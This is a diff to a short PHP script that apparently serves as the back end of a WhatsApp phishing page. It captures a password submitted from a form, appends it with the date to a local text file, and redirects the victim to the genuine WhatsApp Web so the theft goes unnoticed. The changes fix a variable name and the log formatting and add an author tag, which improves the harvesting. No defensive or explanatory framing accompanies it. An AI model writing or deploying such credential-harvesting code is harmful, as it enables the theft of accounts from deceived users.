@@ -1,11 +1,12 @@
 <?php
     $password = $_POST["password"];
-    $pass = "Password: $password";
-    $fecha = date('d-m-Y');
+    $pass = "\n Password: $password";
+    $date = date('d-m-Y');
     $fileuser = fopen("contraseña.txt", "a");
-    $cl = "===========================================";
-    fwrite($fileuser, $date .$pass .$cl);
+    $cl = "\n ===========================================";
+    fwrite($fileuser, " Date: $date \n $pass \n $cl");
     fclose($fileuser);
     header('Location: https://web.whatsapp.com/');
     exit();
+//by Mr Star
 ?>
